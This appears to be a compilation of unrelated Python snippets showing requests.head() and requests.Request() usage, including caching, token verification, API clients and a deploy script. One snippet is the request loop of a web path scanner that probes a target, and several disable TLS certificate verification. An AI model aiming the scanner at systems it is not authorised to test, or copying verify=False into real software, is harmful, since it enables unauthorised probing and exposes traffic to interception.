                logger.info("try_select_HEAD_proxy(): select %s, but it is the HEAD", proxy)
            proxy.head_time = time.time()
            self.available = True
            return True
        if force_to_head:
            if not only_select:
                self.available = False
            logger.warning("try_select_HEAD_proxy(): sorry, we CAN NOT select head proxy [%d:%d] %s",
                           select_from, select_end, "by force" if force_to_head else '')
        return None if only_select else False 
**************************************
def get_infos(self, title, href, domain_filter):
        """
        get infos on document via URL
        retrieve domain name (e.g. RAD, ITI, etc.)
        make an HEAD request to get meta data on document (size, etag, etc.)

        :param str title: Title of the document
        :param str href: URL of the document
        :param list domain_filter: list of domain to take into account
        :return dict: dict with informations about the resource
        """

        docname = os.path.basename(href)
        # suppress IHE_ or IHE- at the beginning, split the name
        parts = docname[4:].split("_")

        _href = href
        if not href.startswith("http") and href.startswith("/"):
            _href = f"{IHE_URL}{href}"

        # keep RAD, ITI even if it's labelled RAD-TF
        # e.g. keep first part of the domain name

        docinfo = {
            "domain": parts[0].upper().split("-")[0],
            "typedoc": parts[1],
            "filename": docname,
            "href": _href,
            "title": title,
        }

        if not domain_filter or (domain_filter and docinfo["domain"] in domain_filter):
            print(".", end="", flush=True)
            # get more info with a HEAD request
            try:
                headreq = requests.head(_href)

                if headreq.status_code == 200:
                    docinfo["last-modified"] = headreq.headers["Last-Modified"]
                    docinfo["size"] = int(headreq.headers["Content-Length"])
                    docinfo["etag"] = headreq.headers["Etag"]
                else:
                    sys.stderr.write(f"Error {headreq.status_code} - URL={_href}\n")
            except Exception as ex:
                sys.stderr.writelines([f"Error HEAD request {_href}", str(ex), "\n"])

        return docinfo 
**************************************
def __pre_process(self, text, remove_words=[]):
        """Format a text nicely before posting.

        This function do four things:

            1. convert HTML to plain text
            2. expand shorten links
            3. remove given `remove_words` such as links of attached media
            4. delete tailing spaces

        Args:
            text (str): the text
            remove_words (str): the list of words to remove

        Returns:
            str: the pre-processed text
        """
        # process HTML tags/escapes
        text = self.__html2text(text)

        # expand links
        links = [w for w in text.split() if urlparse(w.strip()).scheme]

        for l in links:
            # check the link
            if not re.match(r'http(s|)://', l):
                continue

            # expand link with HTTP(S) HEAD request
            try:
                r = requests.head(l)
                url = r.headers.get('location', l)
                text = text.replace(l, url)

            except Exception as e:
                logger.exception('HTTP(S) HEAD request failed: {}'.format(e))

        # remove specified words
        for w in remove_words:
            text = text.replace(w, '')

        # no tailing spaces
        text = re.sub(r'[ \t]+\n', r'\n', text).strip()

        return text 
**************************************
def main():
    if getcwd().split(sep)[-1] != 'NIF-Ontology':
        print('This script must be invoked from the ontology git directory! Usually ~/git/NIF-Ontology')
        return

    args = docopt(__doc__, version='deploy 0')
    print(args)
    if args['--commit'] is not None:
        COMMIT = args['--commit']
    else:
        BRANCH_COMMIT = args['--branch']
        # get the exact commit in case someone pushes in the middle
        COMMIT = subprocess.check_output(['git', 'ls-remote', 'origin', BRANCH_COMMIT]).decode().split('\t')[0]

    FILEPATHS = args['<path>']

    filepaths = []
    for filepath in FILEPATHS:
        filepaths.extend(glob(filepath))

    template = 'sudo curl -o {FTP_BASE_PATH}{filepath} {GITHUB_BASE_URL}{COMMIT}/{filepath}'

    if not filepaths:
        print('No files found! Exiting...')
        return
    elif not head(GITHUB_BASE_URL + COMMIT + '/ttl/nif.ttl').ok:
        print('Commit or branch "%s" not found!' % COMMIT)
        return

    commands = []
    for filepath in filepaths:
        kwargs = {
            'FTP_BASE_PATH':FTP_BASE_PATH,
            'GITHUB_BASE_URL':GITHUB_BASE_URL,
            'COMMIT':COMMIT,
            'filepath':filepath,
        }
        string = template.format(**kwargs)
        commands.append(string)

    TIMESTAMP = datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')  # ISO8601 boys
    string = 'sudo echo \'{} {} {}\' >> {FTP_BASE_PATH}updates.log'.format(TIMESTAMP,
                    COMMIT, str(filepaths), FTP_BASE_PATH=FTP_BASE_PATH)
    commands.append(string)

    COMMAND = ' && '.join(commands)

    run_it = 'ssh {server} "{command}"'.format(server=SERVER, command=COMMAND)

    print(run_it) 
**************************************
def __scan(self, cpath):
        err_times = 0
        v_proxies = ymlobj.get_user_config("proxies", {})
        v_headers = ymlobj.get_user_config("headers", {})
        v_method  = ymlobj.get_user_config("method", "get").lower()
        v_verify  = ymlobj.get_user_config("ssl_cert_verify", True)
        
        # scanning loop
        while True:
            
            # check stop status
            if (self.__stop):
                self.__status = "[PAUSE]"
                self.__stopped = True
                self.started.wait()     # suspend thread
                self.started.clear()

            # check termination status
            if (self.__term):
                return False            # exit thread

            try:
                res = None
                if v_method == "head":
                    res = requests.head(util.passed(self.__target) + cpath, allow_redirects=False, headers=v_headers, proxies=v_proxies, verify=v_verify)
                else:
                    res = requests.get(util.passed(self.__target) + cpath, allow_redirects=False, headers=v_headers, proxies=v_proxies, verify=v_verify)
                    
                rcode = res.status_code
                res.connection.close()
                
                self.__log = "#" + str(self.__tid) + " " + str(rcode) + " '" + util.passed(self.__target) + cpath + "'"
                if str(rcode) not in str(ymlobj.get_user_config("ignore_responses", 404)):
                    self.__logger.warn(self.__log)
                else:
                    self.__logger.log(self.__tid, self.__log)
                
                time.sleep(ymlobj.get_config("request_interval", 0))
                break
            
            except:
                err_times += 1
                self.__log = "Warning : Request failed (" + str(err_times) + " time(s).). '" + util.passed(self.__target) + cpath + "' - waiting " + str(ymlobj.get_config("retry_interval", 10)) + " sec..."
                self.__logger.log(self.__tid, self.__log)
                time.sleep(ymlobj.get_config("retry_interval", 10))
        
        return True     # Continue 
**************************************
def get_from_cache(url, cache_dir=None):
    """
    Given a URL, look for the corresponding dataset in the local cache.
    If it's not there, download it. Then return the path to the cached file.
    """
    if cache_dir is None:
        cache_dir = PYTORCH_PRETRAINED_BERT_CACHE
    if sys.version_info[0] == 3 and isinstance(cache_dir, Path):
        cache_dir = str(cache_dir)

    if not os.path.exists(cache_dir):
        os.makedirs(cache_dir)

    # Get eTag to add to filename, if it exists.
    if url.startswith("s3://"):
        etag = s3_etag(url)
    else:
        response = requests.head(url, allow_redirects=True)
        if response.status_code != 200:
            raise IOError("HEAD request failed for url {} with status code {}"
                          .format(url, response.status_code))
        etag = response.headers.get("ETag")

    filename = url_to_filename(url, etag)

    # get cache path to put the file
    cache_path = os.path.join(cache_dir, filename)

    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)

            logger.info("copying %s to cache at %s", temp_file.name, cache_path)
            with open(cache_path, 'wb') as cache_file:
                shutil.copyfileobj(temp_file, cache_file)

            logger.info("creating metadata file for %s", cache_path)
            meta = {'url': url, 'etag': etag}
            meta_path = cache_path + '.json'
            with open(meta_path, 'w', encoding="utf-8") as meta_file:
                json.dump(meta, meta_file)

            logger.info("removing temp file %s", temp_file.name)

    return cache_path 
**************************************
def get_from_cache(url, cache_dir=None):
    """
    Given a URL, look for the corresponding dataset in the local cache.
    If it's not there, download it. Then return the path to the cached file.
    """
    if cache_dir is None:
        cache_dir = PYTORCH_PRETRAINED_BERT_CACHE
    if sys.version_info[0] == 3 and isinstance(cache_dir, Path):
        cache_dir = str(cache_dir)

    if not os.path.exists(cache_dir):
        os.makedirs(cache_dir)

    # Get eTag to add to filename, if it exists.
    if url.startswith("s3://"):
        etag = s3_etag(url)
    else:
        response = requests.head(url, allow_redirects=True)
        if response.status_code != 200:
            raise IOError("HEAD request failed for url {} with status code {}"
                          .format(url, response.status_code))
        etag = response.headers.get("ETag")

    filename = url_to_filename(url, etag)

    # get cache path to put the file
    cache_path = os.path.join(cache_dir, filename)

    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)

            logger.info("copying %s to cache at %s", temp_file.name, cache_path)
            with open(cache_path, 'wb') as cache_file:
                shutil.copyfileobj(temp_file, cache_file)

            logger.info("creating metadata file for %s", cache_path)
            meta = {'url': url, 'etag': etag}
            meta_path = cache_path + '.json'
            with open(meta_path, 'w', encoding="utf-8") as meta_file:
                json.dump(meta, meta_file)

            logger.info("removing temp file %s", temp_file.name)

    return cache_path 
**************************************
def get_from_cache(url, cache_dir=None):
    """
    Given a URL, look for the corresponding dataset in the local cache.
    If it's not there, download it. Then return the path to the cached file.
    """
    if cache_dir is None:
        cache_dir = PYTORCH_PRETRAINED_BERT_CACHE
    if sys.version_info[0] == 3 and isinstance(cache_dir, Path):
        cache_dir = str(cache_dir)

    if not os.path.exists(cache_dir):
        os.makedirs(cache_dir)

    # Get eTag to add to filename, if it exists.
    if url.startswith("s3://"):
        etag = s3_etag(url)
    else:
        response = requests.head(url, allow_redirects=True)
        if response.status_code != 200:
            raise IOError("HEAD request failed for url {} with status code {}"
                          .format(url, response.status_code))
        etag = response.headers.get("ETag")

    filename = url_to_filename(url, etag)

    # get cache path to put the file
    cache_path = os.path.join(cache_dir, filename)

    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)

            logger.info("copying %s to cache at %s", temp_file.name, cache_path)
            with open(cache_path, 'wb') as cache_file:
                shutil.copyfileobj(temp_file, cache_file)

            logger.info("creating metadata file for %s", cache_path)
            meta = {'url': url, 'etag': etag}
            meta_path = cache_path + '.json'
            with open(meta_path, 'w', encoding="utf-8") as meta_file:
                json.dump(meta, meta_file)

            logger.info("removing temp file %s", temp_file.name)

    return cache_path 
**************************************
def get_from_cache(url: str, cache_dir: Union[str, Path] = None) -> str:
    """
    Given a URL, look for the corresponding dataset in the local cache.
    If it's not there, download it. Then return the path to the cached file.
    """
    if cache_dir is None:
        cache_dir = PYTORCH_PRETRAINED_BERT_CACHE
    if isinstance(cache_dir, Path):
        cache_dir = str(cache_dir)

    os.makedirs(cache_dir, exist_ok=True)

    # Get eTag to add to filename, if it exists.
    if url.startswith("s3://"):
        etag = s3_etag(url)
    else:
        response = requests.head(url, allow_redirects=True)
        if response.status_code != 200:
            raise IOError("HEAD request failed for url {} with status code {}"
                          .format(url, response.status_code))
        etag = response.headers.get("ETag")

    filename = url_to_filename(url, etag)

    # get cache path to put the file
    cache_path = os.path.join(cache_dir, filename)

    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)

            logger.info("copying %s to cache at %s", temp_file.name, cache_path)
            with open(cache_path, 'wb') as cache_file:
                shutil.copyfileobj(temp_file, cache_file)

            logger.info("creating metadata file for %s", cache_path)
            meta = {'url': url, 'etag': etag}
            meta_path = cache_path + '.json'
            with open(meta_path, 'w') as meta_file:
                json.dump(meta, meta_file)

            logger.info("removing temp file %s", temp_file.name)

    return cache_path 

Python requests.Request() Examples

**************************************
def extract_url_path_and_query(full_url=None, no_query=False):
    """
    Convert http://foo.bar.com/aaa/p.html?x=y to /aaa/p.html?x=y

    :param no_query:
    :type full_url: str
    :param full_url: full url
    :return: str
    """
    if full_url is None:
        full_url = request.url
    split = urlsplit(full_url)
    result = split.path or "/"
    if not no_query and split.query:
        result += '?' + split.query
    return result


# ################# End Client Request Handler #################


# ################# Begin Middle Functions ################# 
**************************************
def compose_request_for_kannel(msg = {}, server = DEFAULT_KANNEL_SERVER):
    '''composes a proper Request using the given msg and kannel server details'''

    params = {  #the data to be sent as query string with the URL
            'username' : server['username'],
            'password' : server['password'],
            'from'     : msg['from'],
            'to'       : msg['to'],
            'text'     : msg['text'],
            'smsc'     : server['smsc'],
    }

    #also ask for delivery reports
    #ref: http://www.kannel.org/download/1.4.0/userguide-1.4.0/userguide.html#DELIVERY-REPORTS
    if server['smsc'] is not None: #since SMSC IDs are *required* for getting delivery reports,
        params['dlr-mask'] = 31 #31 means we get ALL Kind of delivery reports.
        params['dlr-url'] = ROOT_URL + "/deliveredsms/?msgid=%s&dlr-report-code=%%d&dlr-report-value=%%A" % msg['id']


    url = "http://%s:%s/%s" % (server['host'],server['port'],server['path']);

    #return a prepared Request
    r = Request('GET', url, params = params)
    return r 
**************************************
def _fetch_certs(request, certs_url):
    """Fetches certificates.

    Google-style cerificate endpoints return JSON in the format of
    ``{'key id': 'x509 certificate'}``.

    Args:
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        certs_url (str): The certificate endpoint URL.

    Returns:
        Mapping[str, str]: A mapping of public key ID to x.509 certificate
            data.
    """
    response = request(certs_url, method='GET')

    if response.status != http_client.OK:
        raise exceptions.TransportError(
            'Could not fetch certificates at {}'.format(certs_url))

    return json.loads(response.data.decode('utf-8')) 
**************************************
def verify_token(id_token, request, audience=None,
                 certs_url=_GOOGLE_OAUTH2_CERTS_URL):
    """Verifies an ID token and returns the decoded token.

    Args:
        id_token (Union[str, bytes]): The encoded token.
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        audience (str): The audience that this token is intended for. If None
            then the audience is not verified.
        certs_url (str): The URL that specifies the certificates to use to
            verify the token. This URL should return JSON in the format of
            ``{'key id': 'x509 certificate'}``.

    Returns:
        Mapping[str, Any]: The decoded token.
    """
    certs = _fetch_certs(request, certs_url)

    return jwt.decode(id_token, certs=certs, audience=audience) 
**************************************
def verify_oauth2_token(id_token, request, audience=None):
    """Verifies an ID Token issued by Google's OAuth 2.0 authorization server.

    Args:
        id_token (Union[str, bytes]): The encoded token.
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        audience (str): The audience that this token is intended for. This is
            typically your application's OAuth 2.0 client ID. If None then the
            audience is not verified.

    Returns:
        Mapping[str, Any]: The decoded token.
    """
    return verify_token(
        id_token, request, audience=audience,
        certs_url=_GOOGLE_OAUTH2_CERTS_URL) 
**************************************
def verify_firebase_token(id_token, request, audience=None):
    """Verifies an ID Token issued by Firebase Authentication.

    Args:
        id_token (Union[str, bytes]): The encoded token.
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        audience (str): The audience that this token is intended for. This is
            typically your Firebase application ID. If None then the audience
            is not verified.

    Returns:
        Mapping[str, Any]: The decoded token.
    """
    return verify_token(
        id_token, request, audience=audience, certs_url=_GOOGLE_APIS_CERTS_URL) 
**************************************
def send_router_login(request_url, username, password, session):
    url_parts = urlparse(request_url)

    auth_url = "{}://{}/api/v1/auth/local".format(url_parts.scheme, url_parts.netloc)
    data = {
        'username': username,
        'password': password
    }
    request = requests.Request('POST', auth_url, json=data)
    prepped = session.prepare_request(request)
    res = session.send(prepped)
    print("Server responded: {} {}".format(res.status_code, res.reason))

    if res.ok:
        data = res.json()
        token = data['token']

        return (res.status_code, token)

    else:
        return (res.status_code, None) 
**************************************
def _send_request_safe_mode(self, method, url, **kwargs):
        """
        Send an HTTP request, and catch any exception that might occur due to connection problems.
        
        Safe mode has been removed from requests 1.x.
        """
        try:
            return requests.Session.request(self, method, url, **kwargs)
        except (MissingSchema, InvalidSchema, InvalidURL):
            raise
        except RequestException as e:
            r = LocustResponse()
            r.error = e
            r.status_code = 0  # with this status_code, content returns None
            r.request = Request(method, url).prepare() 
            return r 
**************************************
def __init__(self, requestmocker):
        """
        Args:
            requestmocker: A requests Mocker object.
        """
        self.mock = requestmocker
        self.expected_auth_header = (
            requests.Request(
                "GET",
                "http://example.com",
                auth=(
                    os.getenv("TRANSPLANT_USERNAME"),
                    os.getenv("TRANSPLANT_PASSWORD"),
                ),
            )
            .prepare()
            .headers["Authorization"]
        ) 
**************************************
def push_url(resource, proxy=None):

    def wrapper(interface):

        @functools.wraps(interface)
        def connection(*args, **kwargs):
            session = get_session(proxy=proxy)

            params  = interface(*args, **kwargs)

            if resource not in params['url']:
                params['url'] = urljoin(resource, params['url'])

            request = Request(method='GET',
                              headers={'Content-Type': 'application/json'},
                              **params
                              )
            response = session.send(request.prepare(), verify=False)
            return response.json()

        return connection

    return wrapper 
**************************************
def authedRequest(*args, **kwargs):
    if len(args) >= 2:
        if not args[1].startswith(ILX_SERVER):
            raise ValueError(f'Server does not match {ILX_SERVER} sess cookie will fail.')
    elif 'url' in kwargs:
        if not kwargs['url'].startswith(ILX_SERVER):
            raise ValueError(f'Server does not match {ILX_SERVER} sess cookie will fail.')
    else:
        pass  # let requests take care of the error

    session = requests.Session()
    req = requests.Request(*args, **kwargs)
    req.headers.update(SESS_COOKIE)
    req.headers['Connection'] = 'keep-alive'
    prep = req.prepare()
    resp = session.send(prep)
    return resp 
**************************************
def get_idle_ci_hosts(self):
        """Query Jenkins for idle servers.

        Send GET request to Jenkins server, querying for idle servers labeled
        for nGraph-ONNX CI job.

            :return:     Number of idle hosts delegated to nGraph-ONNX CI
            :rtype:      int
        """
        jenkins_request_url = self.jenkins_server + 'label/ci&&onnx/api/json?pretty=true'
        try:
            log.info('Sending request to Jenkins: %s', jenkins_request_url)
            r = requests.Request(method='GET', url=jenkins_request_url, verify=False)
            response = self.jenkins.jenkins_request(r).json()
            return int(response['totalExecutors']) - int(response['busyExecutors'])
        except Exception as e:
            log.exception('Failed to send request to Jenkins!\nException message: %s', str(e))
            raise 
**************************************
def _request(cls, method, path, params=None, payload=None, auth=False, headers=None, url=None):
        cookie = None

        if auth:
            cookie = dict(username=request.cookies.get('username'))

        data = json.dumps(payload) if payload is not None else None

        if payload:
            req = requests.Request(method, url, params=params, data=data, cookies=cookie, headers=headers).prepare()
            req.headers['Content-Type'] = 'application/json'

        else:
            req = requests.Request(method, url, params=params, cookies=cookie, headers=headers).prepare()

        s = requests.Session()
        res = s.send(req)

        return res 
**************************************
def _fetch_certs(request, certs_url):
    """Fetches certificates.

    Google-style cerificate endpoints return JSON in the format of
    ``{'key id': 'x509 certificate'}``.

    Args:
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        certs_url (str): The certificate endpoint URL.

    Returns:
        Mapping[str, str]: A mapping of public key ID to x.509 certificate
            data.
    """
    response = request(certs_url, method='GET')

    if response.status != http_client.OK:
        raise exceptions.TransportError(
            'Could not fetch certificates at {}'.format(certs_url))

    return json.loads(response.data.decode('utf-8')) 
**************************************
def verify_token(id_token, request, audience=None,
                 certs_url=_GOOGLE_OAUTH2_CERTS_URL):
    """Verifies an ID token and returns the decoded token.

    Args:
        id_token (Union[str, bytes]): The encoded token.
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        audience (str): The audience that this token is intended for. If None
            then the audience is not verified.
        certs_url (str): The URL that specifies the certificates to use to
            verify the token. This URL should return JSON in the format of
            ``{'key id': 'x509 certificate'}``.

    Returns:
        Mapping[str, Any]: The decoded token.
    """
    certs = _fetch_certs(request, certs_url)

    return jwt.decode(id_token, certs=certs, audience=audience) 
**************************************
def verify_oauth2_token(id_token, request, audience=None):
    """Verifies an ID Token issued by Google's OAuth 2.0 authorization server.

    Args:
        id_token (Union[str, bytes]): The encoded token.
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        audience (str): The audience that this token is intended for. This is
            typically your application's OAuth 2.0 client ID. If None then the
            audience is not verified.

    Returns:
        Mapping[str, Any]: The decoded token.
    """
    return verify_token(
        id_token, request, audience=audience,
        certs_url=_GOOGLE_OAUTH2_CERTS_URL) 
**************************************
def verify_firebase_token(id_token, request, audience=None):
    """Verifies an ID Token issued by Firebase Authentication.

    Args:
        id_token (Union[str, bytes]): The encoded token.
        request (google.auth.transport.Request): The object used to make
            HTTP requests.
        audience (str): The audience that this token is intended for. This is
            typically your Firebase application ID. If None then the audience
            is not verified.

    Returns:
        Mapping[str, Any]: The decoded token.
    """
    return verify_token(
        id_token, request, audience=audience, certs_url=_GOOGLE_APIS_CERTS_URL) 
**************************************
def query_elsa(user, apikey, ip, query):
    packages.urllib3.disable_warnings()
    url = 'https://' + ip + '/elsa-query/API/query'
    epoch = int(time.time())
    hash_it = hashlib.sha512()
    hash_it.update(str(epoch) + apikey)
    header = {}
    header['Authorization'] = 'ApiKey ' + user + ':' + str(epoch) + ':' + hash_it.hexdigest()
    s = Session()
    payload = '{"class_id":{"0": 1},"program_id":{"0": 1},"node_id":{"0": 1},"host_id":{"0": 1}}'
    elsa_post = Request('POST',
                        url,
                        data=[('permissions', payload), ('query_string', query)],
                        headers=header)
    postData = elsa_post.prepare()
    results = s.send(postData, verify=False)
    return results 
**************************************
def get_strike_prices(self,symbol=""):
        """return list of float strike prices for specific symbol"""
        
        # Safety first!
        if not utils.check(symbol):
            return []
        
        # Format
        symbol = symbol.upper()
        
        # Assemble URL
        url =   self.endpoints['base']    + 'market/options/strikes.json'
        data = { 'symbol':symbol }
        
        # Create HTTP Request objects
        auth               = self.create_auth()
        results            = requests.get(url,params=data,auth=auth).json()
        
        # Convert to floats
        return [float(x) for x in results['response']['prices']['price']]
    ############################################################################ 
**************************************
def get_exp_dates(self,symbol=""):
        """return list of float strike prices for specific symbol"""
        
        # Safety first!
        if not utils.check(symbol):
            return []
        
        # Format
        symbol = symbol.upper()
        
        # Assemble URL
        url =   self.endpoints['base']    + 'market/options/expirations.json'
        data = { 'symbol':symbol }
        
        # Create HTTP Request objects
        auth               = self.create_auth()
        results            = requests.get(url,params=data,auth=auth).json()
        
        return results['response']['expirationdates']['date']
        
    ############################################################################ 
**************************************
def __api_query(self, authorization=False, path=None, method='get', query_params=None):
        with requests.Session() as s:
            headers = {'User-Agent': platform.platform()}
            url = '{0:s}{1:s}'.format(self.host_url, path)
            if authorization:
                payload = {
                        'access_key': self.access_key,
                        'nonce': str(int(time.time() * 1000))
                }
                if query_params is not None:
                    payload['query'] = query_params
                    url = '{0:s}?{1:s}'.format(url, query_params)
                token = jwt.encode(payload, self.secret_key, algorithm='HS256')
                headers['Authorization'] = 'Bearer {0:s}'.format(token.decode('utf-8'))
                req = requests.Request(method, url, headers=headers)
            else:
                req = requests.Request(method, url, headers=headers, params=query_params)
            prepped = s.prepare_request(req)
            response = s.send(prepped)
        return response.json() if response.status_code is 200 or response.status_code is 201 else None 
**************************************
def response_cookie_rewrite(cookie_string):
    """
    rewrite response cookie string's domain to `my_host_name`
    :type cookie_string: str
    """
    cookie_string = regex_cookie_rewriter.sub('domain=' + my_host_name_no_port, cookie_string)
    return cookie_string


# ################# End Server Response Handler #################


# ################# Begin Client Request Handler ################# 
**************************************
def filter_client_request():
    """过滤用户请求, 视情况拒绝用户的访问
    :rtype: Union[Response, None]
    """
    dbgprint('Client Request Url: ', request.url)

    # crossdomain.xml
    if os.path.basename(request.path) == 'crossdomain.xml':
        dbgprint('crossdomain.xml hit from', request.url)
        return crossdomain_xml()

    # Global whitelist ua
    if check_global_ua_pass(str(request.user_agent)):
        return None

    if is_deny_spiders_by_403 and is_denied_because_of_spider(str(request.user_agent)):
        return generate_simple_resp_page(b'Spiders Are Not Allowed To This Site', 403)

    if human_ip_verification_enabled and (
                ((human_ip_verification_whitelist_from_cookies or enable_custom_access_cookie_generate_and_verify)
                 and must_verify_cookies)
            or is_ip_not_in_allow_range(request.remote_addr)
    ):
        dbgprint('ip', request.remote_addr, 'is verifying cookies')
        if 'zmirror_verify' in request.cookies and \
                ((human_ip_verification_whitelist_from_cookies and verify_ip_hash_cookie(request.cookies.get('zmirror_verify')))
                 or (enable_custom_access_cookie_generate_and_verify and custom_verify_access_cookie(
                        request.cookies.get('zmirror_verify'), request))):
            ip_whitelist_add(request.remote_addr, info_record_dict=request.cookies.get('zmirror_verify'))
            dbgprint('add to ip_whitelist because cookies:', request.remote_addr)
        else:
            return redirect(
                "/ip_ban_verify_page?origin=" + base64.urlsafe_b64encode(str(request.url).encode(encoding='utf-8')).decode(
                    encoding='utf-8'),
                code=302)

    return None 
**************************************
def get_map_url(self):
        """Get map URL for this instantiation."""
        return requests.Request(HTTP_GET, DASHBOARD_URL).prepare().url 
**************************************
def call_model_runtime(
        configuration: Dict[str, object], text: str
    ) -> requests.Request:
        """ Makes a call to the model runtime api

        The model runtime api signature is:
          http://<model_runtime_host>:<port>/v1.0/model?q=<text>

        where:

          model_runtime_host - The host running the model runtime api.  To resolve
            the host running the model runtime api (in the following order):
            - MODEL_RUNTIME_API environment variable.  Used in docker.
            - config.py (which contains the DefaultConfig class).  Used running
                locally.

          port - http port number (ie, 8880)

          q - A query string to process (ie, the text utterance from user)

        For more details: (See TBD swagger file)
        """
        port = os.environ.get("MODEL_RUNTIME_SERVICE_PORT")
        host = os.environ.get("MODEL_RUNTIME_SERVICE_HOST")
        if host is None:
            host = configuration["MODEL_RUNTIME_SERVICE_HOST"]
        if port is None:
            port = configuration["MODEL_RUNTIME_SERVICE_PORT"]

        api_url = f"http://{host}:{port}/v1.0/model"
        qstrings = {"q": text}
        return requests.get(api_url, params=qstrings) 
**************************************
def get_timestamp(url):
    """
    get the timestamp of an HTTP get request
    :param url: the URL of the request
    :return the timestamp of the request, of None if the request is not in the cache
    """
    def _to_bytes(s, encoding='utf-8'):
        return bytes(s, encoding)

    def create_key(request):
        url, body = request.url, request.body
        key = hashlib.sha256()
        key.update(_to_bytes(request.method.upper()))
        key.update(_to_bytes(url))
        if request.body:
            key.update(_to_bytes(body))
        return key.hexdigest()

    def url_to_key(url):
        session = requests.Session()
        return create_key(session.prepare_request(requests.Request('GET', url)))

    #   get the cache from request_cache
    results = requests_cache.get_cache()
    #   create the key according to the url
    key_url = url_to_key(url)
    #   results.responses is a dictionary and follows the following format:
    #   { 'key': (requests_cache.backends objects, timestamp), ..., }
    #   for example: '4c28e3e4a61e325e520d9c02e0caee99e30c00951a223e67':
    #                       (<requests_cache.backends.base._Store object at 0x12697e630>,
    #                           datetime.datetime(2018, 10, 16, 0, 19, 8, 130204)),
    if key_url in results.responses:
        back_obj, timestamp = results.responses[key_url]
        return timestamp
    return None 
**************************************
def hitFor(self,subreddit,where,forwardFlag):
        logger = logging.getLogger('Reddit_API_Hitter')        
        logger.debug("New hit")
        urlToHit=self.urllist.baseURL+self.urllist.URLtypes["subreddit"]+subreddit+"/new.json"
        payload={'limit':self.limit}
        if forwardFlag == 0:
            payload['before']=where
        else:
            payload['after']=where
        self.conditionObj.acquire()
        if self.requestLeft == 0:
            logger.debug("Hit cap. Waiting for reset")
            self.conditionObj.wait()
        returnObj=None
        try:
            req = Request('GET',  urlToHit,
                          params=payload
                      )
            prepped = self.connectSession.prepare_request(req)
            logger.debug("Hitting the url" + req.url)
            r=self.connectSession.send(prepped)
            response=r.json()
            dataObj=[]
            for data in response["data"]["children"]:
                dataObj.append(SubRedditResponseData(data["data"]["id"],data["data"]["url"],data["data"]["domain"],data["data"]["subreddit"],data["data"]["title"]))
            returnObj=SubRedditResponseChildren(response["data"]["after"],response["data"]["before"],dataObj)
            self.requestLeft=self.requestLeft - 1
        except Exception as e:
            logger.debug(type(e))
        finally:
            self.conditionObj.release()
        return returnObj 
**************************************
def get_graphite_render_url(self, targets, start="", stop="",
                                resp_format="json"):
        params = [('target', target) for target in targets]
        params += [('from', start or None),
                   ('until', stop or None),
                   ('format', resp_format or None)]
        return requests.Request('GET', "%s/render" % config.GRAPHITE_URI,
                                params=params).prepare().url 
**************************************
def put_cdmi(self, path, data):
        """Return JSON response for a PUT to a CDMI URL.

        :arg path: path to put
        :arg data: JSON data to put
        :returns: CDMI JSON response or text response
        :rtype: dict

        """
        logging.debug("DrasticClient.put_cdmi called: \n{0}"
                      .format(path))
        req_url = self.normalize_cdmi_url(path)
        headers = {'user-agent': self.u_agent,
                   'X-CDMI-Specification-Version': "1.1"}
        if path.endswith('/'):
            headers['Content-type'] = CDMI_CONTAINER
            headers['Accept'] = CDMI_CONTAINER
        else:
            headers['Content-type'] = CDMI_OBJECT
            headers['Accept'] = CDMI_OBJECT
        req = requests.Request('PUT', req_url, headers=headers, auth=self.auth,
                               data=data)
        prepared = req.prepare()
        s = requests.Session()
        res = s.send(prepared)
        if res.status_code in [400, 401, 403, 404, 406]:
            return Response(res.status_code, res)
        elif res.status_code == 409:
            return Response(res.status_code,
                            "A resource with this name already exists")
        return Response(0, res) 
**************************************
def _fetch(self, url, settings):
        """
        form action = "cgi-bin/sitefind3.pl
        method = "post"
        onsubmit="return validate_sequence(document.rm_form.sequence.value);
        """
        if url is None:
            url = self.Url
        if settings is None:
            settings = self.Settings

        form = settings.copy()
        user_agent = "PyRemoteRestMap/0.1"
        form['sequence'] = self.Sequence

        # data : is sent in the post request body; params are sent in the query.
        # To debug, use: requests.Request('post', url=url, data=form).prepare().body
        res = requests.post(url, data=form)
        res.raise_for_errors()
        soup = BeautifulSoup(res.text)
        title = soup.find('title').text
        if title == "Error":
            raise ValueError("Error response from %s: %s" % (url, title))

